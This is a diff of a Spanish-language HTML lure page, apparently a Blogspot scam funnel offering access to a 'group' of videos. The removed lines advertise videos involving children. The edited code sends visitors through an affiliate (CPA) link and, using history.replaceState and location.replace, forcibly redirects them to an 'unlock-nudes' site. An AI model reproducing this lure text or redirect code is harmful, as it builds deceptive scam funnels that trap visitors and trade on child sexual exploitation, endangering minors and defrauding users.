@@ -37,8 +37,7 @@ padding: 0;
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 
-<script src="../js/cinfo.js"></script>
-<script src="../js/language.js"></script>
+
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-VC8JSTHDC0"></script>
 <script>
@@ -811,7 +810,7 @@ main {
 				return biaoqing;
 			}
 			
-			var groupDetail = ["Más de 200 videos sobre niños", "Más de 30 videos sobre mujeres jóvenes y niños"];
+			var groupDetail = ["Más de 200 videos", "Más de 30 videos sobre mujeres"];
 			function getdetail() {
 				let gdetail = groupDetail[Math.floor(Math.random() * groupDetail.length)];
 				gdetail = gdetail.replace("@@City@@", city);
@@ -824,7 +823,7 @@ main {
 			}
 
             var width = 0,
-                cpa = "https://www.ewaflcdn.site/link/jump/ws/18qun/es.html";
+                cpa = "https://unlock-nudes.github.io";
 				
 				$("#join").click(function () {
 					$("#intro").hide();
@@ -886,7 +885,7 @@ main {
                     history.replaceState(null, document.title, location.pathname);
                     setTimeout(function () {
                         location.replace(
-                            "https://www.ewaflcdn.site/link/jump/ws/18qun/es.html"
+                            "https://unlock-nudes.github.io"
                         );
                     }, 0);
                 }
